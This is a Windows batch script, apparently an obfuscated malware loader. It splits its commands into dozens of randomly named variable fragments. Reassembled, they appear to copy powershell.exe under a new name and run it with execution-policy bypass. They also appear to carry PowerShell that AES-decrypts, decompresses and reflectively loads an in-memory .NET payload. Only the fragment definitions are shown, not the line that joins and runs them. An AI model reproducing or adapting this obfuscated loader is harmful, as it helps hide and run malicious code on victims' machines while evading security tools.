@echo off
set "bzETOYhHJy= /"
set "SrnfGRiLgd=s\"
set "JZhaGEZyRo=Sy"
set "eMQDFpHzIw=32"
set "UlzphNojwY=xe"
set "xxqfpVgVSI=rS"
set "DliHbOSDTS=he"
set "dQScDBmGfi=co"
set "XtTFuxlCjL=po"
set "FnLbGgYNbm=ll"
set "LMEueViqbv=py"
set "WjomNpJnMC=y "
set "FeRyLjLoyi=0\"
set "QpqkJintLR=ll"
set "jDpssnyWGo=nd"
set "CPsVvpnxgP= C"
set "rLJjVYHSfA=ws"
set "hpQjCycRcV=:\"
set "MkMVhILntq=we"
set "MQMfUoHcWh=Po"
set "ZwRyNTdxLE=we"
set "GQfNHyCxNN=in"
set "pPMqjnpIjs=do"
set "oPApbwWvSF=ow"
set "hMjnqbSzVI=1."
set "goCUUyBAYl=.e"
set "ntyOdpzGPY=\v"
set "wlwKnSpkMA=em"
set "aglOHZksGs=st"
set "xxEDEMfzxG=\W"
set "RKrmaydGwV=he"
set "oyStHjCadT=rs"
set "PKHHPsGopg=Wi"
set "ndVvyuPune= %~dp0"
set "GcafLNOWPk=cd"
set "QVqaURCfEn=)))"
set "HjvblYeCyw== [S"
set "XPIlGwZCDw=)($Q"
set "GZUJIjgyTX=ypto"
set "GPrYBtLMkv=yTo("
set "pczkZBQcgS=3); "
set "AwWtUnansd=('%*'"
set "qCtRrlYTno=-joi"
set "pHuoLBiJLq=6] -"
set "dSFLQexyxT=B.Pa"
set "VBrrMZqToK=CiwB"
set "FcoNyZbKST=wB.I"
set "uffVCAXUTx=mory"
set "FSmxbvUold=HO3I"
set "rhkAjmfOke=comp"
set "ZDdgglOtvR=ment"
set "boJLGDlIVf=morF"
set "moePwfpbTL=t Sy"
set "sZszddJKDu=7kGw"
set "gtOuaYpClH=iron"
set "cyttTjGDxI=ck($"
set "SKiVlzDZLL=Invo"
set "txXpqIjXvS=rt]:"
set "HUsSJzAVDR=yste"
set "mvpQCeizoQ= = $"
set "qqpzfXpgwz=$brM"
set "qvEkBtZfdH=..-1"
set "SpTOaWTPou=);$T"
set "QemLvqMZWe=e) {"
set "JMaSUpXwJS= = N"
set "vlsFAlzgnA=O.Me"
set "elKiGjykEN=form"
set "uHkixdsaDY=De ="
set "bwPvMyeGLq=CiwB"
set "OJorxCQEZQ=Mode"
set "RlzOalhary=TllA"
set "tpQAhCPehj=oArr"
set "QbWchEDVWj=ddin"
set "csmIBQuoFZ=in $"
set "WbLVNEGvQL=ddin"
set "lzfAgvYPny=ion."
set "BxLLEMiokc=ptor"
set "HTeieQadex=embl"
set "LgSZOUWnri=b.En"
set "YNQqBsNUwY=$AWQ"
set "dwsIwZuUCu=($sr"
set "FiGbxyxWPQ=.Dis"
set "ksIzltZmPB=;$AW"
set "DrJeFwcFJO=ecry"
set "rcBzHJDjcF=n ''"
set "JoCEUbyysi=hy.A"
set "gERtWiZFIn=sion"
set "xFefnIQMZo=dV1k"
set "tQtvHCZDzP=Comp"
set "jLLPTmvIPM=Stre"
set "IyQZkwuSXC=Secu"
set "gTMPQKOKXg=tsWi"
set "iMgtjfDpcH=;$sU"
set "eRAviFlclq=$TCi"
set "lEAlUwndHe=ach "
set "fQtpSruouM=)) {"
set "pikMigKvbw=Obje"
set "MaCrYJzgov=y.Pa"
set "JPyQVYgLyU=1] -"
set "MkQtklOGpj=brMQ"
set "oDdEEyuFWp=S46e"
set "fOOsrrSdAY=oL'["
set "BMnwNbAyJm=('da"
set "XeKCBwPJRk=TCiw"
set "HDVhxaYGDK=PKCS"
set "QFoXMdKyvm=ew-O"
set "kJdQwJLSHi=Qhi."
set "yCoETOidoi=k; }"
set "ERiljnSxYv=bypa"
set "FcDhSJwZPK=QcXz"
set "QcaYMwBDTf=CiwB"
set "MWDRZqdpne=Gx.T"
set "QgTTzWhIvX=tem."
set "gwkXOnOfWN=le  "
set "FlDOIHaLTF=();$"
set "SuIcvyjYau=New-"
set "kkksVucgst=bjec"
set "mReqGCBzBH=urit"
set "MCpZzbisaN=ewLi"
set "jXBcIveBFL=ress"
set "CSaeOddxfs=1..-"
set "FHlNyqETuu=FZoD"
set "RugwqhgKCV=oryS"
set "dgdKbVrlyq=m.Re"
set "vXrtUfajfv=saBm"
set "gdapNUxEBz=y.Ci"
set "ALTeIUTqAl=yste"
set "zQAkfjxGYX=IoO3"
set "mZDXvYXXTm=CiwB"
set "ZjAiQxZbmk=F = "
set "yaaAPMSQiX= [Sy"
set "TdpDVmgRXA=ring"
set "MIjetYYRyG=dF, "
set "XuXwOSrZvI=Qhi "
set "jOCIBDGwVJ=-nop"
set "QGGbMOXUYo=[Sys"
set "TNJGxEeREM=ress"
set "KHfLEPPTzl=CiwB"
set "GIPlPUFIud=-4] "
set "oSWfzvRepv=aDNK"
set "XASJTEegAM=g = "
set "dSAlJrADwc=::('"
set "aMmEGgUxVO=y]::"
set "cMmgaFNWSf=ose("
set "INRasDIiWv=ay()"
set "lhekxYgAml=IZt."
set "IojtBgVAgu=DNJS"
set "QkyBkOLSKD=);$s"
set "cScwScgJQJ=$bGE"
set "MkJxILWIhQ=cXzx"
set "kXhsFGIYzO=.Mod"
set "RNxnDuUHYg=tryP"
set "cJKXuEqfGR=rity"
set "AEGAJRQQpb=]::("
set "higvvYSkfo=gth)"
set "ZsiTfQkzIi=join"
set "fibefUePOn=; };"
set "yDQuSwsYmp=stem"
set "VrUmYFUNmo=em.C"
set "BDnQJxbsOj=Bmor"
set "mjNybrGsBN=gnir"
set "wEeVSZauMS=EdF."
set "adeTjlNzvY=Syst"
set "VRIAAxElhJ=, (,"
set "lFrgpQedNk=stem"
set "EJyVAiNPYY=:: '"
set "OMaRPfZtDo=QcXz"
